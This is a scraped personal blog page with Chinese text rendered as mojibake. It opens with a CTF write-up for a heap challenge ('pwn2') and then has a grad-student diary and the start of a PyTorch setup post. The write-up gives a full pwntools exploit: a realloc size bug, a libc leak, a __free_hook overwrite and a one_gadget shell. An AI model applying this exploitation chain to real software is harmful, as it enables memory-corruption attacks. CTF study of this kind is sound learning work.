<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  if ( *((_DWORD *)ptr[v2] + 8) != v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = ptr[v2];</span><br><span class="line">    v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);	//realloc()å‡½æ•°,æ¼æ´åˆ©ç”¨å…³é”®ç‚¹</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;new message:&quot;);</span><br><span class="line">  return read(0, *((void **)ptr[v2] + 3), *((signed int *)ptr[v2] + 8));	//æ¼æ´ç‚¹, message size æœªæ›´æ–°</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ³„æ¼-libc"><a href="#æ³„æ¼-libc" class="headerlink" title="æ³„æ¼ libc"></a>æ³„æ¼ libc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn2&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./pwn2&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(title,name,size,message):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendafter(&#x27;title:\n&#x27;,title)</span><br><span class="line">	p.sendafter(&#x27;name:\n&#x27;,name)</span><br><span class="line">	p.sendafter(&#x27;message size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;message:\n&#x27;,message)</span><br><span class="line">def edit(ind,size,message):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;message size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;new message:\n&#x27;,message)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯æ¡†æ¶å‡½æ•°,ä¹‹åä¸€ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new(&#x27;a&#x27;,&#x27;a&#x27;,0x80,&#x27;a&#x27;*0x80)</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">è®©ä»– malloc å‡ºæ¥ä¸€å—ä¸å±äº fastbin çš„å †,å†</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>new(â€˜bâ€™,â€™bâ€™,1,â€™bâ€™)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">é˜²æ­¢`topchunk`åå¹¶ä¸Šä¸€ä¸ª,ç„¶åç¼–è¾‘`edit(0,0x90,&#x27;1&#x27;*8)`è®©æ–°çš„ size å’Œæ—§çš„ä¸ç­‰è§¦å‘</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>v1[3] &#x3D; realloc(*((void **)ptr[v2] + 3), v3 + 1);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è¿™æ ·æˆ‘ä»¬ä¹‹å‰çš„ç¬¬ä¸€ä¸ªå—å°±åˆ°äº†`unsortedbin`ä¸­,ç„¶ååœ¨`new(&#x27;d&#x27;,&#x27;d&#x27;,0x80,&#x27;d&#x27;*8)`ä¸€å—,è¿™æ ·å­å†…å®¹å¤´å°±ç”¨çš„æ˜¯ unsortedbin ,å¡«å…¥ title å’Œ name æ—¶å€™å ç”¨çš„å°±æ˜¯ä¹‹å‰ unsortedbin æ®‹ç•™çš„ fd å’Œ bk äº†,å¡«å……ä¸€ä¸ªå­—èŠ‚ä¹‹å `show(2)` è®©å®ƒæ³„æ¼å‡ºæ¥å‡å»åç§»å­—èŠ‚,è¿™æ ·å°±å¾—åˆ°äº† libc</span><br><span class="line"></span><br><span class="line">## getshell</span><br><span class="line"></span><br><span class="line">æœ‰äº† libc ååŸºæœ¬æ€è·¯å°±ç¡®å®šäº†,ä¿®æ”¹å†…å®¹å¤´ä½¿å…¶æŒ‡å‘`__free_hook`,å¹¶ç›´æ¥ edit ä¸º one_gadget ,ä¹‹å free è§¦å‘ getshell ,æ‰€ä»¥å…³é”®ä¾¿æ˜¯å¦‚ä½•æº¢å‡ºè¦†ç›–å†…å®¹å¤´</span><br><span class="line"></span><br><span class="line">é¦–å…ˆ</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>new(â€˜aâ€™,â€™aâ€™,0xf7,â€™aâ€™*0x20)<br>edit(3,0xb8,â€™0â€™)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">æ„é€ ä¸€ä¸ªå †,å¹¶ç¼–è¾‘,ä½¿å¾—è¯¥å—åº•ä¸‹æœ‰ä¸€å—å¯æ§èŒƒå›´,å¹¶æ§åˆ¶åœ¨ 0x30 çš„ fastbin ä¸­,ä¾¿äºèƒ½æº¢å‡ºåˆ°å†…å®¹å¤´,ä¹‹å</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>new(â€˜dâ€™,â€™dâ€™,1,â€™dâ€™)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è¿™ä¸ªå—å°±ä¸­æ‹›äº†,æˆ‘ä»¬èƒ½å¤Ÿæº¢å‡ºå®ƒ,ä¹‹åå¡«å…¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„å †</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>edit(3,0xb8,â€™\x01â€™*0xc8+p64(0x31)*4+p64(libc.symbols[â€˜__free_hookâ€™] + leak)+p64(0x51))</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å…¶ä¸­çš„æ’æ­¥æ•ˆæœå¦‚ä¸‹</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>0x1474310:	0x0101010101010101	0x0000000000000031<br>0x1474320:	0x0000000000000031	0x0000000000000031<br>0x1474330:	0x0000000000000031	0x00007f15621627a8<br>0x1474340:	0x0000000000000051	0x0000000000020cc1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ä¹‹åå°±æ˜¯ç¼–è¾‘ä¸º one_gadget å’Œè§¦å‘äº†,è¿™é‡Œè¦æ³¨æ„ä¸€å®šè¦å’Œè‡ªå·±å¡«å…¥çš„ size ä¸€æ ·,ä¸ç„¶åˆè§¦å‘`v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);`,æˆ–å¤§æˆ–å°éƒ½ä¸ä¼šæˆåŠŸ,å¤§çš„è¯é‡æ–° malloc ,å°çš„è¯æœ‰é€ƒä¸è¿‡æ£€æŸ¥</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>edit(4,0x51,p64(one))<br>free(0)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>[+] Starting local process â€˜.&#x2F;pwn2â€™: pid 6300<br>0x7f507bfa2000<br>[*] Switching to interactive mode<br>$  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">æˆåŠŸ</span><br><span class="line"></span><br><span class="line">## å®Œæ•´exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>from pwn import *<br>p &#x3D; process(â€˜.&#x2F;pwn2â€™,aslr&#x3D;2)<br>elf &#x3D; ELF(â€œ.&#x2F;pwn2â€, checksec&#x3D;False)<br>libc &#x3D; ELF(â€˜&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6â€™, checksec&#x3D;False)<br>#context.log_level &#x3D; â€œdebugâ€<br>def new(title,name,size,message):<br>	p.sendafter(â€˜Input your choice:â€™,â€™1â€™)<br>	p.sendafter(â€˜title:\nâ€™,title)<br>	p.sendafter(â€˜name:\nâ€™,name)<br>	p.sendafter(â€˜message size:\nâ€™,str(size))<br>	p.sendafter(â€˜message:\nâ€™,message)<br>def edit(ind,size,message):<br>	p.sendafter(â€˜Input your choice:â€™,â€™2â€™)<br>	p.sendafter(â€˜Which one?\nâ€™,str(ind))<br>	p.sendafter(â€˜message size:\nâ€™,str(size))<br>	p.sendafter(â€˜new message:\nâ€™,message)<br>def show(ind):<br>	p.sendafter(â€˜Input your choice:â€™,â€™3â€™)<br>	p.sendafter(â€˜Which one?\nâ€™,str(ind))<br>def free(ind):<br>	p.sendafter(â€˜Input your choice:â€™,â€™4â€™)<br>	p.sendafter(â€˜Which one?\nâ€™,str(ind))</p>
<p>new(â€˜aâ€™,â€™aâ€™,0x80,â€™aâ€™*0x80)<br>new(â€˜bâ€™,â€™bâ€™,1,â€™bâ€™)<br>edit(0,0x90,â€™1â€™*8)<br>new(â€˜dâ€™,â€™dâ€™,0x80,â€™dâ€™*8)<br>show(2)<br>p.recvuntil(â€˜Title: â€˜)<br>leak &#x3D; u64(p.recvuntil(â€˜\nâ€™)[:-1].ljust(8,â€\x00â€))-0x3c4b64<br>print hex(leak)<br>new(â€˜aâ€™,â€™aâ€™,0xf7,â€™aâ€™*0x20)<br>edit(3,0xb8,â€™0â€™)<br>new(â€˜dâ€™,â€™dâ€™,1,â€™dâ€™)<br>edit(3,0xb8,â€™\x01â€™*0xc8+p64(0x31)*4+p64(libc.symbols[â€˜__free_hookâ€™] + leak)+p64(0x51))<br>one&#x3D;leak+0x4526a<br>edit(4,0x51,p64(one))<br>free(0)<br>p.interactive()</p>
<pre><code>
æœ€åæ„é€ å‡ºæ¥çš„å—å¤ªæ¶å¿ƒäº†,ä½†è¿˜å¥½æˆåŠŸäº†,æœ¬é¢˜éš¾ç‚¹å°±æ˜¯å†…å®¹å¤´æ•°æ®ç»“æ„å’Œ realloc çš„ç†è§£äº†,å‰©ä¸‹æ²¡ä»€ä¹ˆéš¾ç‚¹,ç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€ƒæ„é€ çš„é¢˜
</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/02/2022-01-02-pwnbeginer/" data-id="cuidLea4PnUjNsVF99qJm-f5E" data-title="pwn æ–°æ‰‹å‘" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021-10-04-lately" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/04/2021-10-04-lately/" class="article-date">
  <time class="dt-published" datetime="2021-10-03T16:00:00.000Z" itemprop="datePublished">2021-10-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/04/2021-10-04-lately/">ç ”ä¸€</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="10-4"><a href="#10-4" class="headerlink" title="10.4"></a>10.4</h2><p>ä»Šå¤©æ˜¯ 2021 å¹´å›½åº†å‡æœŸç¬¬å››å¤©ï¼Œä¹Ÿåˆšå¥½æ˜¯æ¥è¥¿ç”µçš„ç¬¬ä¸€ä¸ªæœˆï¼Œè¿™ä¸€ä¸ªæœˆç»å†äº†è®¸å¤šå¤§å­¦æ—¶å€™æƒ³éƒ½æ²¡æƒ³è¿‡çš„äº‹æƒ…ï¼Œæ€»ä¹‹ï¼Œè¿˜æ˜¯ååˆ†â€¦è‡ªé—­çš„ğŸ˜¢ã€‚</p>
<p>è¯»ç ”å’Œæœ¬ç§‘æœŸé—´çœŸæ˜¯å·®äº†å¤ªå¤šå¤ªå¤šäº†ï¼Œæˆ‘åˆ°ç°åœ¨è¿˜æ²¡ç¡®å®šè‡ªå·±çš„ä¸“ä¸šæ–¹å‘ï¼Œè‡ªå·±åœ¨åºŠä¸Šçœ‹ç€èˆå‹æ•²ä»£ç åˆ°åŠå¤œä¸€ä¸¤ç‚¹ï¼Œä¸Šè¯¾æœŸé—´ä¹Ÿä¸å’‹è®¤çœŸå¬è®²ï¼Œçº¯çº¯çš„èººå¹³äº†ã€‚å°±ç°åœ¨çœ‹ç‚¹<br>æ·±åº¦å­¦ä¹  çš„ä¸œè¥¿ã€‚</p>
<p>å…¶å®åˆ°ç°åœ¨æˆ‘ä¹Ÿä¸çŸ¥é“è‡ªå·±å½“æ—¶åšçš„é€‰æ‹©å¯¹ä¸å¯¹ï¼šå¦‚æœå½“æ—¶æ²¡è€ƒä¸Šçš„è¯ï¼Œæˆ‘ç°åœ¨å¯èƒ½åœ¨ 360 æ iot ï¼Ÿåˆæˆ–è€…æ˜¯å»ç æµ·é‚£è¾¹æèŠ¯ç‰‡ï¼Ÿåˆç”šè‡³æ˜¯äºŒæˆ˜ï¼Ÿ</p>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ¬ç§‘æœŸé—´æˆ‘çš„ç›®æ ‡å¾ˆæ˜ç¡®ï¼Œå°±æ˜¯å­¦å®‰å…¨ï¼Œæ¯å¤©é™¤äº†å®éªŒå®¤å°±æ˜¯æ•™å®¤é£Ÿå ‚ã€‚è€Œåˆ°äº†è¯»ç ”æœŸé—´ï¼Œè‡ªå·±åè€Œæ‡ˆæ€ äº†ã€‚æœ‰æ—¶å€™è§‰å¾—è‡ªå·±å…¶å®ä¸é…è€ƒä¸Šï¼Œæˆ‘éƒ½ä¸çŸ¥é“è‡ªå·±æ€ä¹ˆè€ƒä¸Šçš„ã€‚è‡ªå·±ææ€•æ˜¯çœŸçš„é€‚åˆè€ƒè¯•çªå‡»ï¼Œç„¶åä¸ä¼šç ”ç©¶çš„ èœé¸¡ ç½¢äº†ã€‚</p>
<p>æˆªè‡³ç›®å‰ï¼Œè‡ªå·±çš„å…´è¶£ç‚¹è¿˜æ˜¯ ai ç»“åˆå®‰å…¨çš„ä¸œè¥¿ã€‚ä¸Šæ¬¡å‚åŠ äº‘å®‰å…¨å³°ä¼šæ—¶å€™è¥¿äº¤çš„è€å¸ˆç»™æˆ‘å°è±¡å¤ªæ·±äº†ï¼Œä»–ä»¬ç ”ç©¶çš„å’Œæˆ‘æƒ³å¹²çš„å®Œå®Œå…¨å…¨é‡åˆï¼Œå°±æ˜¯ç ”ç©¶ ai æ¡†æ¶åº•ä¸‹çš„å®‰å…¨é—®é¢˜ï¼Œè€Œä¸”æˆ‘ç‰¹åˆ«ç‰¹åˆ«æ„Ÿå…´è¶£ã€‚<br>è‡ªå·±è¦æ˜¯æçš„è¯ä¸çŸ¥é“è·¯çº¿æ€ä¹ˆèµ°ï¼Œæ‰€ä»¥ç°åœ¨è¿˜æ˜¯æŒ‰éƒ¨å°±ç­çš„å­¦ä¹ ï¼Œæˆé•¿çš„å¾ˆæ…¢ã€‚ä½†æ˜¯å¥½æ­¹ä¹Ÿæ˜¯æ‰¾åˆ°äº†è‡ªå·±ç›®å‰å–œæ¬¢çš„ï¼Œç ”ä¸€ä¸Šè¿˜æ˜¯è¿™æ ·å§ï¼Œæ‰¾æ–¹å‘ï¼Œç„¶åå­¦è¯¾å†…çš„ä¸œè¥¿ï¼ŒåŠ æ²¹ã€‚</p>
<h2 id="10-27"><a href="#10-27" class="headerlink" title="10.27"></a>10.27</h2><p>è§‰å¾—è‡ªå·±è¿˜æ˜¯å¤ªå®‰é€¸äº†ï¼Œæ¯å¤©å­¦å­¦è¯¾ä¸Šçš„ä¸œè¥¿ï¼Œç„¶åè¯¾ä¸‹çœ‹ä¸€ä¸¢ä¸¢ ML çš„ä¸œè¥¿ï¼Œä¹‹å‰çš„åŸºæœ¬åŠŸå…¨ä¸¢äº†ã€‚</p>
<p>ä»ä»Šå¤©å¼€å§‹å­¦ä¸œè¥¿å§ï¼Œè¿˜æ˜¯æ‹¿å¤§å­¦çš„æ¨¡å¼ï¼Œè¿™ä¸ªæœˆå¥½å¥½çœ‹çœ‹æ¯”èµ›çš„äº‹æƒ…ï¼Œç ”ç©¶ç”Ÿä¸‰å¹´æˆ‘æƒ³æŠŠé‡ç‚¹è¿˜æ˜¯æ”¾åœ¨æ¯”èµ›ä¸Šï¼Œä»¥èµ›ä¿ƒå­¦ï¼Œæ¯•ç«Ÿè‡ªå·±æ˜¯çœŸçš„åªä¼šåšé¢˜ã€‚ç„¶åæ¯å¤©åœ¨è¿™ä¸Šè¾¹å†™æ€»ç»“å’Œå¤ç›˜å§ã€‚å¼€æ•´</p>
<h2 id="12-6"><a href="#12-6" class="headerlink" title="12.6"></a>12.6</h2><p>ä¸€æ™ƒè¿™ä¹ˆå¿«ï¼Œå·²ç» 3 ä¸ªæœˆäº†ï¼Œè‡ªå·±æ„Ÿè§‰å·²ç»å…¥é—¨äº†ï¼Œä¹Ÿå¼€å§‹çŸ¥é“å¹²å•¥äº†ï¼Œå¾ˆèˆ’æœã€‚ç°åœ¨å­¦äº†ä¸å°‘ä¸œè¥¿ï¼Œè¿˜å¾—ç»§ç»­ï¼Œä¸‹é¢åˆ—ä¸€æ³¢è‡ªå·±æ¸…å•</p>
<ul>
<li><del>PR</del></li>
<li><del>ã€ŠPythonæ•°æ®åˆ†æã€‹</del></li>
<li><del>å¯»æ‰¾å–œæ¬¢çš„æ–¹å‘</del></li>
<li>ã€Šç»Ÿè®¡å­¦ä¹ æ–¹æ³•ã€‹</li>
<li>ã€Šç¥ç»ç½‘ç»œä¸æ·±åº¦å­¦ä¹ ã€‹</li>
<li><del>cs231n</del>ï¼Œè¿˜å·®2èŠ‚ä½œä¸š</li>
<li>å¤©æ± æ¯”èµ›çœŸé¢˜(mlå’Œdlçš„)</li>
</ul>
<p>ç„¶åè¿˜æœ‰äº› C&#x2F;C++ æ¡†æ¶</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/cjson">cjson</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/EZLippi/Tinyhttpd">Tinyhttpd</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Alinshans/MyTinySTL">MyTinySTL</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/oatpp/oatpp">oatpp</a></li>
<li><a target="_blank" rel="noopener" href="https://redis.io/download">Redis</a></li>
<li><a target="_blank" rel="noopener" href="http://nginx.org/">nginx</a></li>
<li>fuzz</li>
</ul>
<h2 id="12-7"><a href="#12-7" class="headerlink" title="12.7"></a>12.7</h2><p>ä»Šå¤©çœ‹ç€ä¸ªå¤§ä½¬çš„<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1b54y177NW">è§†é¢‘</a>ï¼Œæ‰‹æ’¸äº†ä¸€ä¸ªå¯¹æŠ—æ ·æœ¬çš„ç®—æ³•ï¼Œæœ‰å„ç§ bug ï¼Œä½†æ€æƒ³å•¥çš„æ‡‚äº†ï¼Œè€Œä¸” jupyter ä¹Ÿå¤ªå¥½ç”¨äº†å…«ï¼ŒæŠŠ pycharm æ‰”ä¸€è¾¹äº†æš‚æ—¶ã€‚ç°åœ¨è¿™å‡ å¤©åº”è¯¥æ»šå»å†™ä½œä¸šäº†ï¼Œ<del>äº”é¡¹ä½œä¸š</del>ï¼Œè¿™å‘¨äº‰å–ä¸€å¤©æ•´å®Œä¸€é¡¹ã€‚</p>
<h2 id="12-12"><a href="#12-12" class="headerlink" title="12.12"></a>12.12</h2><p>è¿™å‡ å¤©çœ‹äº†å¥½å¤šå¥½å¤šå®‰å…¨çš„è§†é¢‘ï¼Œæˆ‘å®åœ¨æ”¾ä¸ä¸‹ã€‚åŒæ—¶ä¹ŸæŠŠ django æ•´äº†æ•´ï¼ŒçœŸå¥½ç©å•Šã€‚ä»¥åå·ä¸åŠ¨ CV äº†å°±å»å¹²åç«¯ã€‚ä»Šå¤©å†™å®Œä¸¤ä¸ªä½œä¸šï¼Œå°±æ˜¯ä¸€é¡¿æ•²ä»£ç ï¼Œè™½ç„¶è¿˜æ˜¯æœ‰ bug ï¼Œä½†åº”ä»˜ä½œä¸šè¿˜æ˜¯å¤Ÿäº†ã€‚æ˜å¤©åå¤©å¾—æŠŠéšæœºè¿‡ç¨‹ä½œä¸šå†™å®Œï¼Œæˆ‘è¿™é›¶åŸºç¡€ï¼Œæ…Œçš„ä¸€æ‰¹å•Šã€‚</p>
<h2 id="12-16"><a href="#12-16" class="headerlink" title="12.16"></a>12.16</h2><p>è¿™å‘¨åŸºæœ¬å…¨ç»“è¯¾äº†ï¼Œå°±å‰©ä¸€é—¨å·¥ä¼˜äº†ã€‚å‰©ä¸‹è¿™å‡ å‘¨å°±æ˜¯å¤ä¹ äº†ï¼ŒåŒæ—¶å­¦ç‚¹ä¸œè¥¿ã€‚æœ€è¿‘ä¸çŸ¥é“ä¸ºå•¥ï¼Œå¯¹åç«¯è´¼æ„Ÿå…´è¶£ï¼Œè¿™å‡ å¤©æ—¶é—´çœ‹äº† <del>nodejs redis django electron ajax</del> ï¼Œä¸Šè¯¾ä¹Ÿåœ¨çœ‹ï¼Œæ ¹æœ¬åœä¸ä¸‹æ¥é‚£ç§ã€‚ä¸è¡Œä¸è¡Œï¼Œè¿™æ ·ä¸‹å»å¿…æŒ‚ç§‘ã€‚åˆ—ä¸€ä¸‹å¯’å‡è¦å¹²çš„äº‹ï¼ˆè¿˜æŒºå¤šï¼‰ï¼Œç„¶åå®‰å¿ƒå¤ä¹ ï¼š</p>
<ul>
<li>æœ¬èŒå·¥ä½œï¼šçœ‹ä¸¤æœ¬ä¹¦ã€å†™ä¸¤ç»„é¡¹ç›®ã€æ–‡çŒ®ã€coding</li>
<li>çœ‹ Cã€Linux kernelã€Web æŒ–æ´</li>
<li>å­¦å­¦å‰ªè§†é¢‘</li>
<li>ç¯®çƒ</li>
<li>English</li>
</ul>
<h2 id="12-17"><a href="#12-17" class="headerlink" title="12.17"></a>12.17</h2><p>ä»Šå¤©ä¸Šåˆçœ‹äº†ç‚¹åç«¯çš„ï¼Œä¸­åˆåŒºå—é“¾ã€‚çœ‹äº†ç‚¹éšæœºè¿‡ç¨‹æ˜¯çœŸæ²¡åŠ²å•Šã€‚ä¸‹åˆæˆ‘å°±æ˜¯ä¸ªå‚»é€¼ï¼Œç½‘ä¸Šæ‰¾äº†ä¸ª Django é¡¹ç›®ï¼Œç»“æœæ­ç¯å¢ƒæ­äº†åŠå¤©ï¼Œå°±å¾ˆç¦»è°±ï¼Œ requirement.txt å¥½å¤šæ²¡å†™çš„ï¼Œç„¶å pycharm æˆ‘ä¹Ÿä¸å¤ªä¼šï¼Œç¯å¢ƒå½»åº•ä¹±äº†ã€‚ä¿ºä¹Ÿä¸ç®¡äº†ï¼Œç´¢æ€§ä¸ç®¡è™šæ‹Ÿæƒ…å†µäº†ï¼Œç›´æ¥ pip install ã€‚æ²¡è£…mysqlï¼Œæ”¹ï¼ä¸Šsqlite3ï¼djangoç‰ˆæœ¬å¤ªé«˜ï¼Œå¸ï¼ä¸Š3.0ï¼æŠ¥å•¥é”™è£…å•¥åº“ï¼Œâ”­â”®ï¹â”­â”®ã€‚æœ€åç»ˆäºé­”æ”¹å¥½äº†ï¼Œæœ‰é¡¹ç›®çœ‹äº†ã€‚æ™šä¸Šå°±çœ‹è¿™ä¸ªğŸ¤­ï¼Œå¤ä¹ ä¸å­˜åœ¨çš„ã€‚</p>
<h2 id="12-31"><a href="#12-31" class="headerlink" title="12.31"></a>12.31</h2><p>å‰å‡ å¤©é‡è£…äº†ä¸€æ³¢ç³»ç»Ÿï¼Œä¸œè¥¿å•¥çš„éƒ½æ²¡äº†ï¼Œä¹Ÿæ­£å¥½æ¸…ç©ºäº†æ¸…ç©ºï¼Œè‡ªå·±ä¹‹å‰çš„å¥½å¤šä¸œè¥¿é€‰æ‹©æš‚æ—¶æ€§å¿˜è®°ã€‚ä»Šå¹´æœ€åä¸€å¤©ï¼Œå°é—­åœ¨å®¿èˆï¼Œè€ƒè¯•ä¹Ÿæ¨è¿Ÿåˆ°è§£å°äº†ï¼Œä¸å¤ªæƒ³å¤ä¹ äº†å·²ç»ã€‚ä»Šå¤©æ™šä¸Šå¥½å¥½çœ‹çœ‹æ–¹å‘çš„ä¸œè¥¿ï¼Œæƒ³å­¦çš„çœŸæ˜¯æœ‰ç‚¹å¤šï¼Œaiã€blockchainã€kernelã€iotè¿˜æœ‰ SRC ä¹Ÿæƒ³æŒ–æŒ–ã€‚ä»Šå¤©æ™šä¸Šçº ç»“çº ç»“ï¼Œæ˜å¤©æˆ‘ä¸ç®¡äº†ï¼Œå¼€å¯å¯’å‡ä½œæ¯ï¼Œå¼±åŒ–å¤ä¹ ï¼Œç›´æ¥é«˜å¼ºåº¦å­¦ä¸œè¥¿ã€‚</p>
<p>å¤§è‡´æ–¹å‘æœ‰ä¸‰ä¸ªï¼šaiã€kernelã€SRCã€‚ç›®å‰è¿˜æ˜¯æƒ³èµ°ä¸€èµ°äº¤å‰ï¼Œä»Šå¤©å†çœ‹çœ‹å§ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/04/2021-10-04-lately/" data-id="cuid2GTIL-o8v_LNDZQVTUWPe" data-title="ç ”ä¸€" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chat/" rel="tag">chat</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2021-09-20-pytorch_sty" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/09/20/2021-09-20-pytorch_sty/" class="article-date">
  <time class="dt-published" datetime="2021-09-19T16:00:00.000Z" itemprop="datePublished">2021-09-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/09/20/2021-09-20-pytorch_sty/">PYTORCHå¤§æ³•</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><blockquote>
<p>Windows ç«¯</p>
</blockquote>
<p>æœ‰äº† anaconda ä½¿å¾—æˆ‘ä»¬çš„ç¯å¢ƒæ­å»ºå˜å¾—ååˆ†ç®€å•ï¼Œæœ‰ä¸¤ç§æ–¹æ¡ˆï¼Œä¸€ç§æ˜¯ä½¿ç”¨ conda çš„æ–¹å¼åˆ›å»ºä¸€ä¸ªä¸“é—¨ç»™ pytorch çš„åº“ï¼Œè¿˜å¯ä»¥ç›´æ¥åœ¨ pip ä¸‹å…¨å±€å®‰è£… pytorch ã€‚æˆ‘ä½¿ç”¨çš„ç¬¬äºŒç§ï¼Œå› ä¸ºä½¿ç”¨ç¬¬ä¸€ç§æ¯æ¬¡è¦æƒ³ä½¿ç”¨ pytorch çš„è¯è¿˜å¾—é‡æ–°ä½¿ç”¨ activate çš„æ–¹å¼è¿›å…¥ pytorchã€‚</p>
<p>è·Ÿç€<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV18K411w7Vs">ææ²å¤§å¤§çš„å®‰è£…é…ç½®æŒ‡å—</a>ï¼Œå…‰é€Ÿå®Œæˆ</p>
